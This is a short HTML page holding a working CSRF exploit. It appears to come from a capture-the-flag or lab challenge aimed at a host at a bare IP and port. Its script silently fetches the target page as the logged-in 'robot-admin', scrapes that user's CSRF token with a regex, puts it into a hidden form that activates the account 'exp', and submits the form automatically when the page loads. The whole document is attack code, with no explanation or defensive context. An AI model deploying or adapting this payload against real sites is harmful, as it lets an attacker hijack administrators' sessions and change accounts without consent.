<form name="csrf" action="http://34.134.162.213:17001/" method="post" enctype="multipart/form-data">
    <input type="hidden" name="username" value="exp" />  <!-- Activate account, modify according to actual needs -->
    <input type="hidden" name="status" value="on" />  <!-- Activation action -->
    <input type="hidden" name="csrf_token" id="csrfTokenField" value=""></form>

<script>
    // Use robot-admin's identity to get robot-admin's token to bypass CSRF validation
    var request = new XMLHttpRequest();
    request.open("GET", decodeURIComponent("http://34.134.162.213:17001/"), false);
    request.send(null);
    var response = request.responseText;
    var groups = response.match("csrf_token\" value=\"(.*?)\"");
    var token = groups[1];
    document.getElementById("csrfTokenField").value = token;  // Replace with robot-admin's token
    document.csrf.submit();
</script>
